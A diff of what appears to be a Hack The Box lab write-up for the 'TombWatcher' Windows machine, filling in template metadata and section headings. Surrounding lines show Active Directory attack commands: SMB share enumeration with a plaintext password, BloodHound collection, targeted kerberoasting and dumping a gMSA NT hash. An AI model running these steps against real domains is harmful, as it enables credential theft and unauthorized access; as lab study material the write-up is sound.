@@ -1,13 +1,13 @@
 
-| Property         | Value                         |
-| ---------------- | ----------------------------- |
-| **OS**           | Linux / Windows               |
-| **Difficulty**   | Easy / Medium / Hard / Insane |
-| **Release Date** | YYYY-MM-DD                    |
-| **State**        | YYYY-MM-DD                    |
-| **IP**           | 10.10.10.X                    |
-| **Techniques**   | technique-1, technique-2      |
-| **Tags**         | #web #privesc #linux          |
+| Property         | Value                    |
+| ---------------- | ------------------------ |
+| **OS**           | Windows                  |
+| **Difficulty**   | Medium                   |
+| **Release Date** | 7th June, 2025           |
+| **State**        | YYYY-MM-DD               |
+| **IP**           | 10.10.10.X               |
+| **Techniques**   | technique-1, technique-2 |
+| **Tags**         | #web #privesc #linux     |
 
 ---
 ## Summary
@@ -115,7 +115,7 @@ PORT      STATE SERVICE
 Nmap done: 1 IP address (1 host up) sc
 ```
 
-### Service Enumeration
+### SMB Enumeration
 
 ```
 nxc smb tombwatcher.htb -u henry -p 'H3nry_987TGV!' --shares
@@ -186,6 +186,8 @@ INFO: Compressing output into 20260924033424_bloodhound.zip
 
 ---
 ## Lateral movement from herny to alfred
+
+![(./screens/1.png)
 
 ### targeted kerberoast
 
@@ -307,6 +309,7 @@ Stopped: Thu Sep 24 03:57:20 2026
 ---
 ### Lateral Movement from alfred to ansible_dev$
 
+reading gmsa NT hash of ansible_dev$
 ```
 python3 gMSADumper.py -u 'alfred' -p 'basketball' -d 'tombwatcher.htb'             
 Users or groups who can read password for ansible_dev$:
